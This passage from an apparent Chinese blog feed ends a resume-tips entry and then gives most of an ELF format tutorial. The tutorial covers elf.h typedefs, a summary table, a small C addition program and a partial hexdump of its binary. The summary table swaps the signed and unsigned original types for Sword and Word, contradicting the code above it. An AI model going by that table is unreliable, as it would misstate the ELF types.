好的简历</h2><blockquote><p>顺便说下好的简历是什么样的，当然一切的前提是有真才实干。</p></blockquote><p>整体要简洁明了，逻辑结构清晰。要能体现出知识、技能、经历、天赋、人脉。</p><ul><li>基本信息<strong>清晰</strong>：姓名、ID、性别、年龄、毕业院校·专业、电话、邮箱、居住地</li><li>工作&amp;项目经验：注意空档期、担任的角色与分工、公司行业知名度</li><li><strong>体现</strong>技术能力：主要的技术栈以及能佐证的事情</li><li>其它<strong>优势</strong>：职业证书、奖项、会议分享、开源项目等</li><li>工作期望和方向：希望得到一个什么样的工作或自己专注的方向</li><li>个人评价：全方位的总结，展示出自己的专业技能掌握程度、亮点、优势等等。</li><li>加分项<ul><li>使用PDF格式，简洁不花哨</li><li>有GitHub并参与过开源项目，可以写一些自己做过的小项目放上去</li><li>有个人博客，会写一些经验和问题的解决思路</li><li>邮箱使用gmail、foxmail或技术类邮箱（<a href="http://php.net" target="_blank" rel="noopener">php.net</a>）、私人域名邮箱等</li></ul></li><li>询问面试官对于自己的评价和可以改进的地方</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网络信息安全从业者面试指南&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;传送门：&lt;a href=&quot;https://github.com/FeeiCN/SecurityInterviewQuestions&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Secur
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>ELF文件格式实例解析</title>
    <link href="https://muzibing.github.io/2020/09/07/2020.09.07%EF%BC%88150%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/07/2020.09.07（150）/</id>
    <published>2020-09-06T16:00:00.000Z</published>
    <updated>2020-09-10T05:27:28.810Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-知识储备"><a href="#0x00-知识储备" class="headerlink" title="0x00 知识储备"></a><font color="navy">0x00 知识储备</font></h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><blockquote><p>接触过Linux文件的朋友应该都很清楚ELF文件，它和windows上的PE文件都是在COFF文件的基础上发展而来，一般在逆向或者说二进制安全方面都会了解其一些相关结构知识，但是由于其入门难、信息量大的原因，导致很多人（当然包括我）在看过很多遍书以后遗忘的速度仍然很快，今天我们就一起通过其源码来对ELF做个深入的了解和剖析。</p></blockquote><h3 id="2-预定义类型"><a href="#2-预定义类型" class="headerlink" title="2.预定义类型"></a>2.预定义类型</h3><blockquote><p>其结构源码被包含在<code>/usr/include/elf.h</code>文件中</p></blockquote><font size="2">首先来看一下预定义的类型</font><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type for a 16-bit quantity.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Half;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Half;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Types for signed and unsigned 32-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf32_Sword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf64_Sword;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type of addresses.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type of file offsets.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Off;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Off;</span><br></pre></td></tr></table></figure><blockquote><font size="2">将上述被定义的类型总结为：</font></blockquote><div class="table-container"><table><thead><tr><th>自定义类型</th><th>描述</th><th>原始类型</th><th>长度</th></tr></thead><tbody><tr><td>ELF32_Addr</td><td>32位版本程序地址</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF32_Half</td><td>32位版本的无符号短整型</td><td>uint16_t</td><td>2</td></tr><tr><td>ELF32_Off</td><td>32位版本的偏移地址</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF32_Sword</td><td>32位版本有符号整型</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF32_Word</td><td>32位版本无符号整型</td><td>int32_t</td><td>4</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td>ELF64_Addr</td><td>64位版本程序地址</td><td>uint64_t</td><td>8</td></tr><tr><td>ELF64_Half</td><td>64位版本的无符号短整型</td><td>uint16_t</td><td>2</td></tr><tr><td>ELF64_Off</td><td>64位版本的偏移地址</td><td>uint64_t</td><td>8</td></tr><tr><td>ELF64_Sword</td><td>64位版本有符号整型</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF64_Word</td><td>64位版本无符号整型</td><td>int32_t</td><td>4</td></tr></tbody></table></div><h3 id="3-ELF文件结构"><a href="#3-ELF文件结构" class="headerlink" title="3.ELF文件结构"></a>3.ELF文件结构</h3><p><img src="/images/150-1.png" alt></p><blockquote><p>图来自<a href="http://chuquan.me/2018/05/21/elf-introduce/" target="_blank" rel="noopener">计算机那些事(4)——ELF文件结构| 楚权的世界</a></p></blockquote><font size="2">从上图我们可以看出ELF温江从上到下的一个结构（按段或者说节区进行划分功能不同的数据区）</font><p><strong>注意</strong>：尽管图中显示的各个组成部分是有顺序的，实际上除了 ELF 头部表以外，其他节区和段都没有规定的顺序</p><h3 id="4-readelf和objdump工具的使用"><a href="#4-readelf和objdump工具的使用" class="headerlink" title="4.readelf和objdump工具的使用"></a>4.readelf和objdump工具的使用</h3><blockquote><p>有关这两个工具的使用，我在下图中进行了展示：</p></blockquote><p><img src="/images/150-2.jpg" alt></p><h2 id="0x01-ELF实例"><a href="#0x01-ELF实例" class="headerlink" title="0x01 ELF实例"></a><font color="navy">0x01 ELF实例</font></h2><h3 id="1-实例代码"><a href="#1-实例代码" class="headerlink" title="1.实例代码"></a>1.实例代码</h3><blockquote><p>代码如下，并将其编译成32位的ELF文件。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result;</span><br><span class="line">        result = num1 + num2;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"num1+num2 = %d\n"</span>,result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num1, num2;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Please input the two number that you want to add:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;num1,&amp;num2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Your input is:%d and %d\n"</span>,num1,num2);</span><br><span class="line">        add(num1,num2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Calculater is END."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ELF文件的二进制形式"><a href="#2-ELF文件的二进制形式" class="headerlink" title="2.ELF文件的二进制形式"></a>2.ELF文件的二进制形式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br></pre></td><td class="code"><pre><span class="line">00000000  7f 45 4c 46 01 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|</span><br><span class="line">00000010  03 00 03 00 01 00 00 00  70 10 00 00 34 00 00 00  |........p...4...|</span><br><span class="line">00000020  30 38 00 00 00 00 00 00  34 00 20 00 0b 00 28 00  |08......4. ...(.|</span><br><span class="line">00000030  1e 00 1d 00 06 00 00 00  34 00 00 00 34 00 00 00  |........4...4...|</span><br><span class="line">00000040  34 00 00 00 60 01 00 00  60 01 00 00 04 00 00 00  |4...`...`.......|</span><br><span class="line">00000050  04 00 00 00 03 00 00 00  94 01 00 00 94 01 00 00  |................|</span><br><span class="line">00000060  94 01 00 00 13 00 00 00  13 00 00 00 04 00 00 00  |................|</span><br><span class="line">00000070  01 00 00 00 01 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00000080  00 00 00 00 fc 03 00 00  fc 03 00 00 04 00 00 00  |................|</span><br><span class="line">00000090  00 10 00 00 01 00 00 00  00 10 00 00 00 10 00 00  |................|</span><br><span class="line">000000a0  00 10 00 00 fc 02 00 00  fc 02 00 00 05 00 00 00  |................|</span><br><span class="line">000000b0  00 10 00 00 01 00 00 00  00 20 00 00 00 20 00 00  |......... ... ..|</span><br><span class="line">000000c0  00 20 00 00 30 02 00 00  30 02 00 00 04 00 00 00  |. ..0...0.......|</span><br><span class="line">000000d0  00 10 00 00 01 00 00 00  f4 2e 00 00 f4 3e 00 00  |.............&gt;..|</span><br><span class="line">000000e0  f4 3e 00 00 2c 01 00 00  30 01 00 00 06 00 00 00  |.&gt;..,...0.......|</span><br><span class="line">000000f0  00 10 00 00 02 00 00 00  fc 2e 00 00 fc 3e 00 00  |.............&gt;..|</span><br><span class="line">00000100  fc 3e 00 00 f0 00 00 00  f0 00 00 00 06 00 00 00  |.&gt;..............|</span><br><span class="line">00000110  04 00 00 00 04 00 00 00  a8 01 00 00 a8 01 00 00  |................|</span><br><span class="line">00000120  a8 01 00 00 44 00 00 00  44 00 00 00 04 00 00 00  |....D...D.......|</span><br><span class="line">00000130  04 00 00 00 50 e5 74 64  7c 20 00 00 7c 20 00 00  |....P.td| ..| ..|</span><br><span class="line">00000140  7c 20 00 00 54 00 00 00  54 00 00 00 04 00 00 00  || ..T...T.......|</span><br><span class="line">00000150  04 00 00 00 51 e5 74 64  00 00 00 00 00 00 00 00  |....Q.td........|</span><br><span class="line">00000160  00 00 00 00 00 00 00 00  00 00 00 00 06 00 00 00  |................|</span><br><span class="line">00000170  10 00 00 00 52 e5 74 64  f4 2e 00 00 f4 3e 00 00  |....R.td.....&gt;..|</span><br><span class="line">00000180  f4 3e 00 00 0c 01 00 00  0c 01 00 00 04 00 00 00  |.&gt;..............|</span><br><span class="line">00000190  01 00 00 00 2f 6c 69 62  2f 6c 64 2d 6c 69 6e 75  |..../lib/ld-linu|</span><br><span class="line">000001a0  78 2e 73 6f 2e 32 00 00  04 00 00 00 14 00 00 00  |x.so.2..........|</span><br><span class="line">000001b0  03 00 00 00 47 4e 55 00  15 e3 de 80 0f 50 a8 0f  |....GNU......P..|</span><br><span class="line">000001c0  21 82 d8 42 91 b4 ef 57  ef a8 28 83 04 00 00 00  |!..B...W..(.....|</span><br><span class="line">000001d0  10 00 00 00 01 00 00 00  47 4e 55 00 00 00 00 00  |........GNU.....|</span><br><span class="line">000001e0  03 00 00 00 02 00 00 00  00 00 00 00 02 00 00 00  |................|</span><br><span class="line">000001f0  08 00 00 00 01 00 00 00  05 00 00 00 00 20 00 20  |............. . |</span><br><span class="line">00000200  00 00 00 00 08 00 00 00  ad 4b e3 c0 00 00 00 00  |.........K......|</span><br><span class="line">00000210  00 00 00 00 00 00 00 00  00 00 00 00 71 00 00 00  |............q...|</span><br><span class="line">00000220  00 00 00 00 00 00 00 00  20 00 00 00 1f 00 00 00  |........ .......|</span><br><span class="line">00000230  00 00 00 00 00 00 00 00  12 00 00 00 26 00 00 00  |............&amp;...|</span><br><span class="line">00000240  00 00 00 00 00 00 00 00  22 00 00 00 8d 00 00 00  |........&quot;.......|</span><br><span class="line">00000250  00 00 00 00 00 00 00 00  20 00 00 00 35 00 00 00  |........ ...5...|</span><br><span class="line">00000260  00 00 00 00 00 00 00 00  12 00 00 00 10 00 00 00  |................|</span><br><span class="line">00000270  00 00 00 00 00 00 00 00  12 00 00 00 9c 00 00 00  |................|</span><br><span class="line">00000280  00 00 00 00 00 00 00 00  20 00 00 00 01 00 00 00  |........ .......|</span><br><span class="line">00000290  04 20 00 00 04 00 00 00  11 00 10 00 00 5f 49 4f  |. ..........._IO|</span><br><span class="line">000002a0  5f 73 74 64 69 6e 5f 75  73 65 64 00 5f 5f 69 73  |_stdin_used.__is|</span><br><span class="line">000002b0  6f 63 39 39 5f 73 63 61  6e 66 00 70 72 69 6e 74  |oc99_scanf.print|</span><br><span class="line">000002c0  66 00 5f 5f 63 78 61 5f  66 69 6e 61 6c 69 7a 65  |f.__cxa_finalize|</span><br><span class="line">000002d0  00 5f 5f 6c 69 62 63 5f  73 74 61 72 74 5f 6d 61  |.__libc_start_ma|</span><br><span class="line">000002e0  69 6e 00 6c 69 62 63 2e  73 6f 2e 36 00 47 4c 49  |in.libc.so.6.GLI|</span><br><span class="line">000002f0  42 43 5f 32 2e 37 00 47  4c 49 42 43 5f 32 2e 31  |BC_2.7.GLIBC_2.1|</span><br><span class="line">00000300  2e 33 00 47 4c 49 42 43  5f 32 2e 30 00 5f 49 54  |.3.GLIBC_2.0._IT|</span><br><span class="line">00000310  4d 5f 64 65 72 65 67 69  73 74 65 72 54 4d 43 6c  |M_deregisterTMCl|</span><br><span class="line">00000320  6f 6e 65 54 61 62 6c 65  00 5f 5f 67 6d 6f 6e 5f  |oneTable.__gmon_|</span><br><span class="line">00000330  73 74 61 72 74 5f 5f 00  5f 49 54 4d 5f 72 65 67  |start__._ITM_reg|</span><br><span class="line">00000340  69 73 74 65 72 54 4d 43  6c 6f 6e 65 54 61 62 6c  |isterTMCloneTabl|</span><br><span class="line">00000350  65 00 00 00 00 00 02 00  03 00 00 00 02 00 04 00  |e...............|</span><br><span class="line">00000360  00 00 01 00 01 00 03 00  47 00 00 00 10 00 00 00  |........G.......|</span><br><span class="line">00000370  00 00 00 00 17 69 69 0d  00 00 04 00 51 00 00 00  |.....ii.....Q...|</span><br><span class="line">00000380  10 00 00 00 73 1f 69 09  00 00 03 00 5b 00 00 00  |....s.i.....[...|</span><br><span class="line">00000390  10 00 00 00 10 69 69 0d  00 00 02 00 67 00 00 00  |.....ii.....g...|</span><br><span class="line">000003a0  00 00 00 00 f4 3e 00 00  08 00 00 00 f8 3e 00 00  |.....&gt;.......&gt;..|</span><br><span class="line">000003b0  08 00 00 00 f8 3f 00 00  08 00 00 00 1c 40 00 00  |.....?.......@..|</span><br><span class="line">000003c0  08 00 00 00 ec 3f 00 00  06 01 00 00 f0 3f 00 00  |.....?.......?..|</span><br><span class="line">000003d0  06 03 00 00 f4 3f 00 00  06 04 00 00 fc 3f 00 00  |.....?.......?..|</span><br><span class="line">000003e0  06 07 00 00 0c 40 00 00  07 02 00 00 10 40 00 00  |.....@.......@..|</span><br><span class="line">000003f0  07 05 00 00 14 40 00 00  07 06 00 00 00 00 00 00  |.....@..........|</span><br><span class="line">00000400  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00001000  53 83 ec 08 e8 a7 00 00  00 81 c3 f7 2f 00 00 8b  |S.........../...|</span><br><span class="line">00001010  83 f4 ff ff ff 85 c0 74  02 ff d0 83 c4 08 5b c3  |.......t......[.|</span><br><span class="line">00001020  ff b3 04 00 00 00 ff a3  08 00 00 00 00 00 00 00  |................|</span><br><span class="line">00001030  ff a3 0c 00 00 00 68 00  00 00 00 e9 e0 ff ff ff  |......h.........|</span><br><span class="line">00001040  ff a3 10 00 00 00 68 08  00 00 00 e9 d0 ff ff ff  |......h.........|</span><br><span class="line">00001050  ff a3 14 00 00 00 68 10  00 00 00 e9 c0 ff ff ff  |......h.........|</span><br><span class="line">00001060  ff a3 f0 ff ff ff 66 90  00 00 00 00 00 00 00 00  |......f.........|</span><br><span class="line">00001070  31 ed 5e 89 e1 83 e4 f0  50 54 52 e8 22 00 00 00  |1.^.....PTR.&quot;...|</span><br><span class="line">00001080  81 c3 80 2f 00 00 8d 83  e0 d2 ff ff 50 8d 83 80  |.../........P...|</span><br><span class="line">00001090  d2 ff ff 50 51 56 ff b3  f8 ff ff ff e8 9f ff ff  |...PQV..........|</span><br><span class="line">000010a0  ff f4 8b 1c 24 c3 66 90  66 90 66 90 66 90 66 90  |....$.f.f.f.f.f.|</span><br><span class="line">000010b0  8b 1c 24 c3 66 90 66 90  66 90 66 90 66 90 66 90  |..$.f.f.f.f.f.f.|</span><br><span class="line">000010c0  e8 e0 00 00 00 81 c2 3b  2f 00 00 8d 8a 20 00 00  |.......;/.... ..|</span><br><span class="line">000010d0  00 8d 82 20 00 00 00 39  c8 74 1d 8b 82 ec ff ff  |... ...9.t......|</span><br><span class="line">000010e0  ff 85 c0 74 13 55 89 e5  83 ec 14 51 ff d0 83 c4  |...t.U.....Q....|</span><br><span class="line">000010f0  10 c9 c3 8d 74 26 00 90  c3 8d b4 26 00 00 00 00  |....t&amp;.....&amp;....|</span><br><span class="line">00001100  e8 a0 00 00 00 81 c2 fb  2e 00 00 55 89 e5 53 8d  |...........U..S.|</span><br><span class="line">00001110  8a 20 00 00 00 8d 82 20  00 00 00 83 ec 04 29 c8  |. ..... ......).|</span><br><span class="line">00001120  89 c3 c1 e8 1f c1 fb 02  01 d8 d1 f8 74 14 8b 92  |............t...|</span><br><span class="line">00001130  fc ff ff ff 85 d2 74 0a  83 ec 08 50 51 ff d2 83  |......t....PQ...|</span><br><span class="line">00001140  c4 10 8b 5d fc c9 c3 8d  b4 26 00 00 00 00 66 90  |...].....&amp;....f.|</span><br><span class="line">00001150  55 89 e5 53 e8 57 ff ff  ff 81 c3 a7 2e 00 00 83  |U..S.W..........|</span><br><span class="line">00001160  ec 04 80 bb 20 00 00 00  00 75 27 8b 83 f0 ff ff  |.... ....u&apos;.....|</span><br><span class="line">00001170  ff 85 c0 74 11 83 ec 0c  ff b3 1c 00 00 00 e8 dd  |...t............|</span><br><span class="line">00001180  fe ff ff 83 c4 10 e8 35  ff ff ff c6 83 20 00 00  |.......5..... ..|</span><br><span class="line">00001190  00 01 8b 5d fc c9 c3 8d  b4 26 00 00 00 00 66 90  |...].....&amp;....f.|</span><br><span class="line">000011a0  e9 5b ff ff ff 8b 14 24  c3 55 89 e5 53 83 ec 14  |.[.....$.U..S...|</span><br><span class="line">000011b0  e8 c4 00 00 00 05 4b 2e  00 00 8b 4d 08 8b 55 0c  |......K....M..U.|</span><br><span class="line">000011c0  01 ca 89 55 f4 83 ec 08  ff 75 f4 8d 90 08 e0 ff  |...U.....u......|</span><br><span class="line">000011d0  ff 52 89 c3 e8 57 fe ff  ff 83 c4 10 90 8b 5d fc  |.R...W........].|</span><br><span class="line">000011e0  c9 c3 8d 4c 24 04 83 e4  f0 ff 71 fc 55 89 e5 53  |...L$.....q.U..S|</span><br><span class="line">000011f0  51 83 ec 10 e8 b7 fe ff  ff 81 c3 07 2e 00 00 83  |Q...............|</span><br><span class="line">00001200  ec 0c 8d 83 18 e0 ff ff  50 e8 22 fe ff ff 83 c4  |........P.&quot;.....|</span><br><span class="line">00001210  10 83 ec 04 8d 45 f0 50  8d 45 f4 50 8d 83 4a e0  |.....E.P.E.P..J.|</span><br><span class="line">00001220  ff ff 50 e8 28 fe ff ff  83 c4 10 8b 55 f0 8b 45  |..P.(.......U..E|</span><br><span class="line">00001230  f4 83 ec 04 52 50 8d 83  4f e0 ff ff 50 e8 ee fd  |....RP..O...P...|</span><br><span class="line">00001240  ff ff 83 c4 10 8b 55 f0  8b 45 f4 83 ec 08 52 50  |......U..E....RP|</span><br><span class="line">00001250  e8 54 ff ff ff 83 c4 10  83 ec 0c 8d 83 68 e0 ff  |.T...........h..|</span><br><span class="line">00001260  ff 50 e8 c9 fd ff ff 83  c4 10 b8 00 00 00 00 8d  |.P..............|</span><br><span class="line">00001270  65 f8 59 5b 5d 8d 61 fc  c3 8b 04 24 c3 66 90 90  |e.Y[].a....$.f..|</span><br><span class="line">00001280  55 e8 5b 00 00 00 81 c5  7a 2d 00 00 57 56 53 83  |U.[.....z-..WVS.|</span><br><span class="line">00001290  ec 0c 89 eb 8b 7c 24 28  e8 63 fd ff ff 8d 9d f8  |.....|$(.c......|</span><br><span class="line">000012a0  fe ff ff 8d 85 f4 fe ff  ff 29 c3 c1 fb 02 74 25  |.........)....t%|</span><br><span class="line">000012b0  31 f6 8d b6 00 00 00 00  83 